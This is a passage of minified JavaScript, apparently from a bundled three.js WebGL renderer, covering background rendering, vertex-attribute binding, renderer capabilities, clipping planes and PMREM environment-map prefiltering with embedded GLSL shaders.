this.uniforms.envMap.value}}),s.update(p)),p.material.uniforms.envMap.value=C,p.material.uniforms.backgroundBlurriness.value=B.backgroundBlurriness,p.material.uniforms.backgroundIntensity.value=B.backgroundIntensity,p.material.uniforms.backgroundRotation.value.setFromMatrix4(xA.makeRotationFromEuler(B.backgroundRotation)).transpose(),C.isCubeTexture&&C.isRenderTargetTexture===!1&&p.material.uniforms.backgroundRotation.value.premultiply(lS),p.material.toneMapped=we.getTransfer(C.colorSpace)!==qe,(x!==C||v!==C.version||_!==o.toneMapping)&&(p.material.needsUpdate=!0,x=C,v=C.version,_=o.toneMapping),p.layers.enableAll(),N.unshift(p,p.geometry,p.material,0,0,null)):C&&C.isTexture&&(m===void 0&&(m=new Oa(new zu(2,2),new la({name:"BackgroundMaterial",uniforms:ao(na.background.uniforms),vertexShader:na.background.vertexShader,fragmentShader:na.background.fragmentShader,side:Zr,depthTest:!1,depthWrite:!1,fog:!1,allowOverride:!1})),m.geometry.deleteAttribute("normal"),Object.defineProperty(m.material,"map",{get:function(){return this.uniforms.t2D.value}}),s.update(m)),m.material.uniforms.t2D.value=C,m.material.uniforms.backgroundIntensity.value=B.backgroundIntensity,m.material.toneMapped=we.getTransfer(C.colorSpace)!==qe,C.matrixAutoUpdate===!0&&C.updateMatrix(),m.material.uniforms.uvTransform.value.copy(C.matrix),(x!==C||v!==C.version||_!==o.toneMapping)&&(m.material.needsUpdate=!0,x=C,v=C.version,_=o.toneMapping),m.layers.enableAll(),N.unshift(m,m.geometry,m.material,0,0,null))}function y(N,B){N.getRGB(vu,aS(o)),i.buffers.color.setClear(vu.r,vu.g,vu.b,B,f)}function S(){p!==void 0&&(p.geometry.dispose(),p.material.dispose(),p=void 0),m!==void 0&&(m.geometry.dispose(),m.material.dispose(),m=void 0)}return{getClearColor:function(){return d},setClearColor:function(N,B=1){d.set(N),h=B,y(d,h)},getClearAlpha:function(){return h},setClearAlpha:function(N){h=N,y(d,h)},render:T,addToRenderList:w,dispose:S}}function yA(o,e){const i=o.getParameter(o.MAX_VERTEX_ATTRIBS),s={},c=_(null);let f=c,d=!1;function h(V,$,ft,j,et){let q=!1;const W=v(V,j,ft,$);f!==W&&(f=W,p(f.object)),q=E(V,j,ft,et),q&&T(V,j,ft,et),et!==null&&e.update(et,o.ELEMENT_ARRAY_BUFFER),(q||d)&&(d=!1,C(V,$,ft,j),et!==null&&o.bindBuffer(o.ELEMENT_ARRAY_BUFFER,e.get(et).buffer))}function m(){return o.createVertexArray()}function p(V){return o.bindVertexArray(V)}function x(V){return o.deleteVertexArray(V)}function v(V,$,ft,j){const et=j.wireframe===!0;let q=s[$.id];q===void 0&&(q={},s[$.id]=q);const W=V.isInstancedMesh===!0?V.id:0;let ht=q[W];ht===void 0&&(ht={},q[W]=ht);let lt=ht[ft.id];lt===void 0&&(lt={},ht[ft.id]=lt);let mt=lt[et];return mt===void 0&&(mt=_(m()),lt[et]=mt),mt}function _(V){const $=[],ft=[],j=[];for(let et=0;et<i;et++)$[et]=0,ft[et]=0,j[et]=0;return{geometry:null,program:null,wireframe:!1,newAttributes:$,enabledAttributes:ft,attributeDivisors:j,object:V,attributes:{},index:null}}function E(V,$,ft,j){const et=f.attributes,q=$.attributes;let W=0;const ht=ft.getAttributes();for(const lt in ht)if(ht[lt].location>=0){const gt=et[lt];let Bt=q[lt];if(Bt===void 0&&(lt==="instanceMatrix"&&V.instanceMatrix&&(Bt=V.instanceMatrix),lt==="instanceColor"&&V.instanceColor&&(Bt=V.instanceColor)),gt===void 0||gt.attribute!==Bt||Bt&&gt.data!==Bt.data)return!0;W++}return f.attributesNum!==W||f.index!==j}function T(V,$,ft,j){const et={},q=$.attributes;let W=0;const ht=ft.getAttributes();for(const lt in ht)if(ht[lt].location>=0){let gt=q[lt];gt===void 0&&(lt==="instanceMatrix"&&V.instanceMatrix&&(gt=V.instanceMatrix),lt==="instanceColor"&&V.instanceColor&&(gt=V.instanceColor));const Bt={};Bt.attribute=gt,gt&&gt.data&&(Bt.data=gt.data),et[lt]=Bt,W++}f.attributes=et,f.attributesNum=W,f.index=j}function w(){const V=f.newAttributes;for(let $=0,ft=V.length;$<ft;$++)V[$]=0}function y(V){S(V,0)}function S(V,$){const ft=f.newAttributes,j=f.enabledAttributes,et=f.attributeDivisors;ft[V]=1,j[V]===0&&(o.enableVertexAttribArray(V),j[V]=1),et[V]!==$&&(o.vertexAttribDivisor(V,$),et[V]=$)}function N(){const V=f.newAttributes,$=f.enabledAttributes;for(let ft=0,j=$.length;ft<j;ft++)$[ft]!==V[ft]&&(o.disableVertexAttribArray(ft),$[ft]=0)}function B(V,$,ft,j,et,q,W){W===!0?o.vertexAttribIPointer(V,$,ft,et,q):o.vertexAttribPointer(V,$,ft,j,et,q)}function C(V,$,ft,j){w();const et=j.attributes,q=ft.getAttributes(),W=$.defaultAttributeValues;for(const ht in q){const lt=q[ht];if(lt.location>=0){let mt=et[ht];if(mt===void 0&&(ht==="instanceMatrix"&&V.instanceMatrix&&(mt=V.instanceMatrix),ht==="instanceColor"&&V.instanceColor&&(mt=V.instanceColor)),mt!==void 0){const gt=mt.normalized,Bt=mt.itemSize,Ut=e.get(mt);if(Ut===void 0)continue;const z=Ut.buffer,pt=Ut.type,At=Ut.bytesPerElement,Y=pt===o.INT||pt===o.UNSIGNED_INT||mt.gpuType===qp;if(mt.isInterleavedBufferAttribute){const ut=mt.data,Tt=ut.stride,wt=mt.offset;if(ut.isInstancedInterleavedBuffer){for(let _t=0;_t<lt.locationSize;_t++)S(lt.location+_t,ut.meshPerAttribute);V.isInstancedMesh!==!0&&j._maxInstanceCount===void 0&&(j._maxInstanceCount=ut.meshPerAttribute*ut.count)}else for(let _t=0;_t<lt.locationSize;_t++)y(lt.location+_t);o.bindBuffer(o.ARRAY_BUFFER,z);for(let _t=0;_t<lt.locationSize;_t++)B(lt.location+_t,Bt/lt.locationSize,pt,gt,Tt*At,(wt+Bt/lt.locationSize*_t)*At,Y)}else{if(mt.isInstancedBufferAttribute){for(let ut=0;ut<lt.locationSize;ut++)S(lt.location+ut,mt.meshPerAttribute);V.isInstancedMesh!==!0&&j._maxInstanceCount===void 0&&(j._maxInstanceCount=mt.meshPerAttribute*mt.count)}else for(let ut=0;ut<lt.locationSize;ut++)y(lt.location+ut);o.bindBuffer(o.ARRAY_BUFFER,z);for(let ut=0;ut<lt.locationSize;ut++)B(lt.location+ut,Bt/lt.locationSize,pt,gt,Bt*At,Bt/lt.locationSize*ut*At,Y)}}else if(W!==void 0){const gt=W[ht];if(gt!==void 0)switch(gt.length){case 2:o.vertexAttrib2fv(lt.location,gt);break;case 3:o.vertexAttrib3fv(lt.location,gt);break;case 4:o.vertexAttrib4fv(lt.location,gt);break;default:o.vertexAttrib1fv(lt.location,gt)}}}}N()}function U(){L();for(const V in s){const $=s[V];for(const ft in $){const j=$[ft];for(const et in j){const q=j[et];for(const W in q)x(q[W].object),delete q[W];delete j[et]}}delete s[V]}}function D(V){if(s[V.id]===void 0)return;const $=s[V.id];for(const ft in $){const j=$[ft];for(const et in j){const q=j[et];for(const W in q)x(q[W].object),delete q[W];delete j[et]}}delete s[V.id]}function P(V){for(const $ in s){const ft=s[$];for(const j in ft){const et=ft[j];if(et[V.id]===void 0)continue;const q=et[V.id];for(const W in q)x(q[W].object),delete q[W];delete et[V.id]}}}function b(V){for(const $ in s){const ft=s[$],j=V.isInstancedMesh===!0?V.id:0,et=ft[j];if(et!==void 0){for(const q in et){const W=et[q];for(const ht in W)x(W[ht].object),delete W[ht];delete et[q]}delete ft[j],Object.keys(ft).length===0&&delete s[$]}}}function L(){F(),d=!0,f!==c&&(f=c,p(f.object))}function F(){c.geometry=null,c.program=null,c.wireframe=!1}return{setup:h,reset:L,resetDefaultState:F,dispose:U,releaseStatesOfGeometry:D,releaseStatesOfObject:b,releaseStatesOfProgram:P,initAttributes:w,enableAttribute:y,disableUnusedAttributes:N}}function MA(o,e,i){let s;function c(m){s=m}function f(m,p){o.drawArrays(s,m,p),i.update(p,s,1)}function d(m,p,x){x!==0&&(o.drawArraysInstanced(s,m,p,x),i.update(p,s,x))}function h(m,p,x){if(x===0)return;e.get("WEBGL_multi_draw").multiDrawArraysWEBGL(s,m,0,p,0,x);let _=0;for(let E=0;E<x;E++)_+=p[E];i.update(_,s,1)}this.setMode=c,this.render=f,this.renderInstances=d,this.renderMultiDraw=h}function EA(o,e,i,s){let c;function f(){if(c!==void 0)return c;if(e.has("EXT_texture_filter_anisotropic")===!0){const P=e.get("EXT_texture_filter_anisotropic");c=o.getParameter(P.MAX_TEXTURE_MAX_ANISOTROPY_EXT)}else c=0;return c}function d(P){return!(P!==zi&&s.convert(P)!==o.getParameter(o.IMPLEMENTATION_COLOR_READ_FORMAT))}function h(P){const b=P===oa&&(e.has("EXT_color_buffer_half_float")||e.has("EXT_color_buffer_float"));return!(P!==Ai&&P!==ia&&!b&&s.convert(P)!==o.getParameter(o.IMPLEMENTATION_COLOR_READ_TYPE))}function m(P){if(P==="highp"){if(o.getShaderPrecisionFormat(o.VERTEX_SHADER,o.HIGH_FLOAT).precision>0&&o.getShaderPrecisionFormat(o.FRAGMENT_SHADER,o.HIGH_FLOAT).precision>0)return"highp";P="mediump"}return P==="mediump"&&o.getShaderPrecisionFormat(o.VERTEX_SHADER,o.MEDIUM_FLOAT).precision>0&&o.getShaderPrecisionFormat(o.FRAGMENT_SHADER,o.MEDIUM_FLOAT).precision>0?"mediump":"lowp"}let p=i.precision!==void 0?i.precision:"highp";const x=m(p);x!==p&&(se("WebGLRenderer:",p,"not supported, using",x,"instead."),p=x);const v=i.logarithmicDepthBuffer===!0,_=i.reversedDepthBuffer===!0&&e.has("EXT_clip_control");i.reversedDepthBuffer===!0&&_===!1&&se("WebGLRenderer: Unable to use reversed depth buffer due to missing EXT_clip_control extension. Fallback to default depth buffer.");const E=o.getParameter(o.MAX_TEXTURE_IMAGE_UNITS),T=o.getParameter(o.MAX_VERTEX_TEXTURE_IMAGE_UNITS),w=o.getParameter(o.MAX_TEXTURE_SIZE),y=o.getParameter(o.MAX_CUBE_MAP_TEXTURE_SIZE),S=o.getParameter(o.MAX_VERTEX_ATTRIBS),N=o.getParameter(o.MAX_VERTEX_UNIFORM_VECTORS),B=o.getParameter(o.MAX_VARYING_VECTORS),C=o.getParameter(o.MAX_FRAGMENT_UNIFORM_VECTORS),U=o.getParameter(o.MAX_SAMPLES),D=o.getParameter(o.SAMPLES);return{isWebGL2:!0,getMaxAnisotropy:f,getMaxPrecision:m,textureFormatReadable:d,textureTypeReadable:h,precision:p,logarithmicDepthBuffer:v,reversedDepthBuffer:_,maxTextures:E,maxVertexTextures:T,maxTextureSize:w,maxCubemapSize:y,maxAttributes:S,maxVertexUniforms:N,maxVaryings:B,maxFragmentUniforms:C,maxSamples:U,samples:D}}function bA(o){const e=this;let i=null,s=0,c=!1,f=!1;const d=new mr,h=new de,m={value:null,needsUpdate:!1};this.uniform=m,this.numPlanes=0,this.numIntersection=0,this.init=function(v,_){const E=v.length!==0||_||s!==0||c;return c=_,s=v.length,E},this.beginShadows=function(){f=!0,x(null)},this.endShadows=function(){f=!1},this.setGlobalState=function(v,_){i=x(v,_,0)},this.setState=function(v,_,E){const T=v.clippingPlanes,w=v.clipIntersection,y=v.clipShadows,S=o.get(v);if(!c||T===null||T.length===0||f&&!y)f?x(null):p();else{const N=f?0:s,B=N*4;let C=S.clippingState||null;m.value=C,C=x(T,_,B,E);for(let U=0;U!==B;++U)C[U]=i[U];S.clippingState=C,this.numIntersection=w?this.numPlanes:0,this.numPlanes+=N}};function p(){m.value!==i&&(m.value=i,m.needsUpdate=s>0),e.numPlanes=s,e.numIntersection=0}function x(v,_,E,T){const w=v!==null?v.length:0;let y=null;if(w!==0){if(y=m.value,T!==!0||y===null){const S=E+w*4,N=_.matrixWorldInverse;h.getNormalMatrix(N),(y===null||y.length<S)&&(y=new Float32Array(S));for(let B=0,C=E;B!==w;++B,C+=4)d.copy(v[B]).applyMatrix4(N,h),d.normal.toArray(y,C),y[C+3]=d.constant}m.value=y,m.needsUpdate=!0}return e.numPlanes=w,e.numIntersection=0,y}}const to=4,TA=6,AA=20,RA=256,fl=new sS,ex=new ze;let Wh=null,qh=0,Yh=0,Zh=!1;const CA=new it,kr=new it;class nx{constructor(e){this._renderer=e,this._pingPongRenderTarget=null,this._lodMax=0,this._cubeSize=0,this._sizeLods=[],this._lodMeshes=[],this._backgroundBox=null,this._cubemapMaterial=null,this._equirectMaterial=null,this._blurMaterial=null,this._ggxMaterial=null}fromScene(e,i=0,s=.1,c=100,f={}){const{size:d=256,position:h=CA}=f;Wh=this._renderer.getRenderTarget(),qh=this._renderer.getActiveCubeFace(),Yh=this._renderer.getActiveMipmapLevel(),Zh=this._renderer.xr.enabled,this._renderer.xr.enabled=!1,this._setSize(d);const m=this._allocateTargets();return m.depthBuffer=!0,this._sceneToCubeUV(e,s,c,m,h),i>0&&this._blur(m,0,0,i),this._applyPMREM(m),this._cleanup(m),m}fromEquirectangular(e,i=null){return this._fromTexture(e,i)}fromCubemap(e,i=null){return this._fromTexture(e,i)}compileCubemapShader(){this._cubemapMaterial===null&&(this._cubemapMaterial=rx(),this._compileMaterial(this._cubemapMaterial))}compileEquirectangularShader(){this._equirectMaterial===null&&(this._equirectMaterial=ax(),this._compileMaterial(this._equirectMaterial))}dispose(){this._dispose(),this._cubemapMaterial!==null&&this._cubemapMaterial.dispose(),this._equirectMaterial!==null&&this._equirectMaterial.dispose(),this._backgroundBox!==null&&(this._backgroundBox.geometry.dispose(),this._backgroundBox.material.dispose())}_setSize(e){this._lodMax=Math.floor(Math.log2(e)),this._cubeSize=Math.pow(2,this._lodMax)}_dispose(){this._blurMaterial!==null&&this._blurMaterial.dispose(),this._ggxMaterial!==null&&this._ggxMaterial.dispose(),this._pingPongRenderTarget!==null&&this._pingPongRenderTarget.dispose();for(let e=0;e<this._lodMeshes.length;e++)this._lodMeshes[e].geometry.dispose()}_cleanup(e){this._renderer.setRenderTarget(Wh,qh,Yh),this._renderer.xr.enabled=Zh,e.scissorTest=!1,Js(e,0,0,e.width,e.height)}_fromTexture(e,i){e.mapping===Kr||e.mapping===io?this._setSize(e.image.length===0?16:e.image[0].width||e.image[0].image.width):this._setSize(e.image.width/4),Wh=this._renderer.getRenderTarget(),qh=this._renderer.getActiveCubeFace(),Yh=this._renderer.getActiveMipmapLevel(),Zh=this._renderer.xr.enabled,this._renderer.xr.enabled=!1;const s=i||this._allocateTargets();return this._textureToCubeUV(e,s),this._applyPMREM(s),this._cleanup(s),s}_allocateTargets(){const e=3*Math.max(this._cubeSize,112),i=4*this._cubeSize,s={magFilter:In,minFilter:In,generateMipmaps:!1,type:oa,format:zi,colorSpace:wu,depthBuffer:!1},c=ix(e,i,s);if(this._pingPongRenderTarget===null||this._pingPongRenderTarget.width!==e||this._pingPongRenderTarget.height!==i){this._pingPongRenderTarget!==null&&this._dispose(),this._pingPongRenderTarget=ix(e,i,s);const{_lodMax:f}=this;({lodMeshes:this._lodMeshes,sizeLods:this._sizeLods}=wA(f)),this._blurMaterial=DA(f,e,i),this._ggxMaterial=NA(f,e,i)}return c}_compileMaterial(e){const i=new Oa(new $n,e);this._renderer.compile(i,fl)}_sceneToCubeUV(e,i,s,c,f){const m=new Ti(90,1,i,s),p=[1,-1,1,1,1,1],x=[1,1,1,-1,-1,-1],v=this._renderer,_=v.autoClear,E=v.toneMapping;v.getClearColor(ex),v.toneMapping=ra,v.autoClear=!1,v.state.buffers.depth.getReversed()&&(v.setRenderTarget(c),v.clearDepth(),v.setRenderTarget(null)),this._backgroundBox===null&&(this._backgroundBox=new Oa(new bl,new Jx({name:"PMREM.Background",side:Jn,depthWrite:!1,depthTest:!1})));const w=this._backgroundBox,y=w.material;let S=!1;const N=e.background;N?N.isColor&&(y.color.copy(N),e.background=null,S=!0):(y.color.copy(ex),S=!0);for(let B=0;B<6;B++){const C=B%3;C===0?(m.up.set(0,p[B],0),m.position.set(f.x,f.y,f.z),m.lookAt(f.x+x[B],f.y,f.z)):C===1?(m.up.set(0,0,p[B]),m.position.set(f.x,f.y,f.z),m.lookAt(f.x,f.y+x[B],f.z)):(m.up.set(0,p[B],0),m.position.set(f.x,f.y,f.z),m.lookAt(f.x,f.y,f.z+x[B]));const U=this._cubeSize;Js(c,C*U,B>2?U:0,U,U),v.setRenderTarget(c),S&&v.render(w,m),v.render(e,m)}v.toneMapping=E,v.autoClear=_,e.background=N}_textureToCubeUV(e,i){const s=this._renderer,c=e.mapping===Kr||e.mapping===io;c?(this._cubemapMaterial===null&&(this._cubemapMaterial=rx()),this._cubemapMaterial.uniforms.flipEnvMap.value=e.isRenderTargetTexture===!1?-1:1):this._equirectMaterial===null&&(this._equirectMaterial=ax());const f=c?this._cubemapMaterial:this._equirectMaterial,d=this._lodMeshes[0];d.material=f;const h=f.uniforms;h.envMap.value=e;const m=this._cubeSize;Js(i,0,0,3*m,2*m),s.setRenderTarget(i),s.render(d,fl)}_applyPMREM(e){const i=this._renderer,s=i.autoClear;i.autoClear=!1;const c=this._lodMeshes.length;for(let f=1;f<c;f++)this._applyGGXFilter(e,f-1,f);i.autoClear=s}_applyGGXFilter(e,i,s){const c=this._renderer,f=this._pingPongRenderTarget,d=this._ggxMaterial,h=this._lodMeshes[s];h.material=d;const m=d.uniforms,p=s/(this._lodMeshes.length-1),x=i/(this._lodMeshes.length-1),v=Math.sqrt(p*p-x*x),_=p*1.25,E=v*_,{_lodMax:T}=this,w=this._sizeLods[s],y=3*w*(s>T-to?s-T+to:0),S=4*(this._cubeSize-w);m.envMap.value=e.texture,m.roughness.value=E,m.mipInt.value=T-i,Js(f,y,S,3*w,2*w),c.setRenderTarget(f),c.render(h,fl),m.envMap.value=f.texture,m.roughness.value=0,m.mipInt.value=T-s,Js(e,y,S,3*w,2*w),c.setRenderTarget(e),c.render(h,fl)}_blur(e,i,s,c){const f=this._pingPongRenderTarget,d=Math.min(c,Math.PI)/Math.SQRT2;this._blurPass(e,f,i,s,d),this._blurPass(f,e,s,s,d)}_blurPass(e,i,s,c,f){const d=this._renderer,h=this._blurMaterial,m=this._lodMeshes[c];m.material=h;const p=h.uniforms;p.envMap.value=e.texture,p.sigma.value=f,p.mipInt.value=this._lodMax-s;const x=this._sizeLods[c],v=3*x*(c>this._lodMax-to?c-this._lodMax+to:0),_=4*(this._cubeSize-x);Js(i,v,_,3*x,2*x),d.setRenderTarget(i),d.render(m,fl)}}function wA(o){const e=[],i=[];let s=o;const c=o-to+1+TA;for(let f=0;f<c;f++){const d=Math.pow(2,s);e.push(d);const h=1/(d-2),m=-h,p=1+h,x=[m,m,p,m,p,p,m,m,p,p,m,p],v=6,_=6,E=3,T=new Float32Array(E*_*v),w=new Float32Array(E*_*v);for(let S=0;S<v;S++){const N=S%3*2/3-1,B=S>2?0:-1,C=[N,B,0,N+2/3,B,0,N+2/3,B+1,0,N,B,0,N+2/3,B+1,0,N,B+1,0];T.set(C,E*_*S);for(let U=0;U<_;U++){const D=x[U*2]*2-1,P=x[U*2+1]*2-1;S===0?kr.set(1,P,D):S===1?kr.set(-D,1,-P):S===2?kr.set(-D,P,1):S===3?kr.set(-1,P,-D):S===4?kr.set(-D,-1,P):kr.set(D,P,-1),kr.toArray(w,(S*_+U)*E)}}const y=new $n;y.setAttribute("position",new Fi(T,E)),y.setAttribute("outputDirection",new Fi(w,E)),i.push(new Oa(y,null)),s>to&&s--}return{lodMeshes:i,sizeLods:e}}function ix(o,e,i){const s=new Bi(o,e,i);return s.texture.mapping=Iu,s.texture.name="PMREM.cubeUv",s.scissorTest=!0,s}function Js(o,e,i,s,c){o.viewport.set(e,i,s,c),o.scissor.set(e,i,s,c)}function NA(o,e,i){return new la({name:"PMREMGGXConvolution",defines:{GGX_SAMPLES:RA,CUBEUV_TEXEL_WIDTH:1/e,CUBEUV_TEXEL_HEIGHT:1/i,CUBEUV_MAX_MIP:`${o}.0`},uniforms:{envMap:{value:null},roughness:{value:0},mipInt:{value:0}},vertexShader:Bu(),fragmentShader:`

			precision highp float;
			precision highp int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;
			uniform float roughness;
			uniform float mipInt;

			#define ENVMAP_TYPE_CUBE_UV
			#include <cube_uv_reflection_fragment>

			#define PI 3.14159265359

			// Van der Corput radical inverse
			float radicalInverse_VdC(uint bits) {
				bits = (bits << 16u) | (bits >> 16u);
				bits = ((bits & 0x55555555u) << 1u) | ((bits & 0xAAAAAAAAu) >> 1u);
				bits = ((bits & 0x33333333u) << 2u) | ((bits & 0xCCCCCCCCu) >> 2u);
				bits = ((bits & 0x0F0F0F0Fu) << 4u) | ((bits & 0xF0F0F0F0u) >> 4u);
				bits = ((bits & 0x00FF00FFu) << 8u) | ((bits & 0xFF00FF00u) >> 8u);
				return float(bits) * 2.3283064365386963e-10; // / 0x100000000
			}

			// Hammersley sequence
			vec2 hammersley(uint i, uint N) {
				return vec2(float(i) / float(N), radicalInverse_VdC(i));
			}

			// GGX VNDF importance sampling (Eric Heitz 2018)
			// "Sampling the GGX Distribution of Visible Normals"
			// https://jcgt.org/published/0007/04/01/
			vec3 importanceSampleGGX_VNDF(vec2 Xi, vec3 V, float roughness) {
				float alpha = roughness * roughness;

				// Section 4.1: Orthonormal basis
				vec3 T1 = vec3(1.0, 0.0, 0.0);
				vec3 T2 = cross(V, T1);

				// Section 4.2: Parameterization of projected area
				float r = sqrt(Xi.x);
				float phi = 2.0 * PI * Xi.y;
				float t1 = r * cos(phi);
				float t2 = r * sin(phi);
				float s = 0.5 * (1.0 + V.z);
				t2 = (1.0 - s) * sqrt(1.0 - t1 * t1) + s * t2;

				// Section 4.3: Reprojection onto hemisphere
				vec3 Nh = t1 * T1 + t2 * T2 + sqrt(max(0.0, 1.0 - t1 * t1 - t2 * t2)) * V;

				// Section 3.4: Transform back to ellipsoid configuration
				return normalize(vec3(alpha * Nh.x, alpha * Nh.y, max(0.0, Nh.z)));
			}

			void main() {
				vec3 N = normalize(vOutputDirection);
				vec3 V = N; // Assume view direction equals normal for pre-filtering

				vec3 prefilteredColor = vec3(0.0);
				float totalWeight = 0.0;

				// For very low roughness, just sample the environment directly
				if (roughness < 0.001) {
					gl_FragColor = vec4(bilinearCubeUV(envMap, N, mipInt), 1.0);
					return;
				}

				// Tangent space basis for VNDF sampling
				vec3 up = abs(N.z) < 0.999 ? vec3(0.0, 0.0, 1.0) : vec3(1.0, 0.0, 0.0);
				vec3 tangent = normalize(cross(up, N));
				vec3 bitangent = cross(N, tangent);

				for(uint i = 0u; i < uint(GGX_SAMPLES); i++) {
					vec2 Xi = hammersley(i, uint(GGX_SAMPLES));

					// For PMREM, V = N, so in tangent space V is always (0, 0, 1)
					vec3 H_tangent = importanceSampleGGX_VNDF(Xi, vec3(0.0, 0.0, 1.0), roughness);

					// Transform H back to world space
					vec3 H = normalize(tangent * H_tangent.x + bitangent * H_tangent.y + N * H_tangent.z);
					vec3 L = normalize(2.0 * dot(V, H) * H - V);

					float NdotL = max(dot(N, L), 0.0);

					if(NdotL > 0.0) {
						// Sample environment at fixed mip level
						// VNDF importance sampling handles the distribution filtering
						vec3 sampleColor = bilinearCubeUV(envMap, L, mipInt);

						// Weight by NdotL for the split-sum approximation
						// VNDF PDF naturally accounts for the visible microfacet distribution
						prefilteredColor += sampleColor * NdotL;
						totalWeight += NdotL;
					}
				}

				if (totalWeight > 0.0) {
					prefilteredColor = prefilteredColor / totalWeight;
				}

				gl_FragColor = vec4(prefilteredColor, 1.0);
			}
		`,blending:Da,depthTest:!1,depthWrite:!1})}function DA(o,e,i){return new la({name:"SphericalGaussianBlur",defines:{SAMPLES:AA,CUBEUV_TEXEL_WIDTH:1/e,CUBEUV_TEXEL_HEIGHT:1/i,CUBEUV_MAX_MIP:`${o}.0`},uniforms:{envMap:{value:null},sigma:{value:0},mipInt:{value:0}},vertexShader:Bu(),fragmentShader:`

			precision highp float;
			precision highp int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;
			uniform float sigma;
			uniform float mipInt;

			#define ENVMAP_TYPE_CUBE_UV
			#include <cube_uv_reflection_fragment>

			#define PI 3.14159265359
			#define GOLDEN_ANGLE 2.39996322973

			void main() {

				if ( sigma == 0.0 ) {

					gl_FragColor = vec4( bilinearCubeUV( envMap, vOutputDirection, mipInt ), 1.0 );
					return;

				}

				vec3 outputDirection = normalize( vOutputDirection );

				vec3 up = abs( outputDirection.z ) < 0.999 ? vec3( 0.0, 0.0, 1.0 ) : vec3( 1.0, 0.0, 0.0 );
				vec3 tangent = normalize( cross( up, outputDirection ) );
				vec3 bitangent = cross( outputDirection, tangent );

				// Truncate the kernel at three standard deviations or at the antipode.
				float thetaMax = min( 3.0 * sigma, PI );
				float truncation = 1.0 - exp( - 0.5 * thetaMax * thetaMax / ( sigma * sigma ) );

				vec3 accumColor = vec3( 0.0 );
				float accumWeight = 0.0;

				for ( int i = 0; i < SAMPLES; i ++ ) {

					// Stratified inverse-CDF sampling of the Gaussian, placed on a golden-angle spiral.
					float stratum = ( float( i ) + 0.5 ) / float( SAMPLES );
					float theta = sigma * sqrt( - 2.0 * log( 1.0 - stratum * truncation ) );
					float phi = float( i ) * GOLDEN_ANGLE;

					vec3 offset = cos( phi ) * tangent + sin( phi ) * bitangent;
					vec3 sampleDirection = cos( theta ) * outputDirection + sin( theta ) * offset;

					// Correct the planar sample density to solid angle.
					float weight = sin( theta ) / theta;

					accumColor += weight * bilinearCubeUV( envMap, sampleDirection, mipInt );
					accumWeight += weight;

				}

				gl_FragColor = vec4( accumColor / accumWeight, 1.0 );

			}
		`,blending:Da,depthTest:!1,depthWrite:!1})}function ax(){return new la({name:"EquirectangularToCubeUV",uniforms:{envMap:{value:null}},vertexShader:Bu(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;

			#include <common>

			void main() {

				vec3 outputDirection = normalize( vOutputDirection );
				vec2 uv = equirectUv( outputDirection );

				gl_FragColor = vec4( texture2D ( envMap, uv ).rgb, 1.0 );

			}
		`,blending:Da,depthTest:!1,depthWrite:!1})}function rx(){return new la({name:"CubemapToCubeUV",uniforms:{envMap:{value:null},flipEnvMap:{value:-1}},vertexShader:Bu(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			uniform float flipEnvMap;

			varying vec3 vOutputDirection;

			uniform samplerCube envMap;

			void main() {

				gl_FragColor = textureCube( envMap, vec3( flipEnvMap * vOutputDirection.x, vOutputDirection.yz ) );

			}
		`,blending:Da,depthTest:!1,depthWrite:!1})}function Bu(){return`

		precision mediump float;
		precision mediump int;

		attribute vec3 outputDirection;

		varying vec3 vOutputDirection;

		void main() {

			vOutputDirection = outputDirection;
			gl_Position = vec4( position, 1.0 );

		}
	`}class cS extends Bi{constructor(e=1,i={}){super(e,e,i),this.isWebGLCubeRenderTarget=!0;const s={width:e,height:e,depth:1},c=[s,s,s,s,s,s];this.texture=new nS(c),this._setTextureOptions(i),this.texture.isRenderTargetTexture=!0}fromEquirectangularTexture(e,i){this.texture.type=i.type,this.texture.colorSpace=i.colorSpace,this.texture.generateMipmaps=i.generateMipmaps,this.texture.minFilter=i.minFilter,this.texture.magFilter=i.magFilter;const s={uniforms:{tEquirect:{value:null}},vertexShader:`

				varying vec3 vWorldDirection;

				vec3 transformDirection( in vec3 dir, in mat4 matrix ) {

					return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );

				}

				void main() {

					vWorldDirection = transformDirection( position, modelMatrix );

					#include <begin_vertex>
					#include <project_vertex>

				}
			`,fragmentShader:`

				uniform sampler2D tEquirect;

				varying vec3 vWorldDirection;

				#include <common>

				void main() {

					vec3 direction = normalize( vWorldDirection );

					vec2 sampleUV = equirectUv( direction );

					gl_FragColor = texture2D( tEquirect, sampleUV );

				}
			`},c=new bl(5,5,5),f=new la({name:"CubemapFromEquirect",uniforms:ao(s.uniforms),vertexShader:s.vertexShader,fragmentShader:s.fragmentShader,side:Jn,blending:Da});f.uniforms.tEquirect.value=i;const d=new Oa(c,f),h=i.minFilter;return i.minFilter===qr&&(i.minFilter=In),new Pb(1,10,this).update(e,d),i.minFilter=h,d.geometry.dispose(),d.material.dispose(),this}clear(e,i=!0,s=!0,c=!0){const f=e.getRenderTarget();for(let d=0;d<6;d++)e.setRenderTarget(this,d),e.clear(i,s,c);e.setRenderTarget(f)}}function UA(o){let e=new WeakMap,i=new WeakMap,s=null;function c(_,E=!1){return _==null?null:E?d(_):f(_)}function f(_){if(_&&_.isTexture){const E=_.mapping;if(E===vh||E===xh)if(e.has(_)){const T=e.get(_).texture;return h(T,_.mapping)}else{const T=_.image;if(T&&T.height>0){const w=new cS(T.height);return w.fromEquirectangularTexture(o,_),e.set(_,w),_.addEventListener("dispose",p),h(w.texture,_.mapping)}else return null}}return _}function d(_){if(_&&_.isTexture){const E=_.mapping,T=E===vh||E===xh,w=E===Kr||E===io;if(T||w){let y=i.get(_);const S=y!==void 0?y.texture.pmremVersion:0;if(_.isRenderTargetTexture&&_.pmremVersion!==S)return s===null&&(s=new nx(o)),y=T?s.fromEquirectangular(_,y):s.fromCubemap(_,y),y.texture.pmremVersion=_.pmremVersion,i.set(_,y),y.texture;if(y!==void 0)return y.texture;{const N=_.image;return T&&N&&N.height>0||w&&N&&m(N)?(s===null&&(s=new nx(o)),y=T?s.fromEquirectangular(_):s.fromCubemap(_),y.texture.pmremVersion=_.pmremVersion,i.set(_,y),_.addEventListener("dispose",x),y.texture):null}}}return _}function h(_,E){return E===vh?_.mapping=Kr:E===xh&&(_.mapping=io),_}function m(_){let E=0;const T=6;for(let w=0;w<T;w++)_[w]!==void 0&&E++;return E===T}function p(_){const 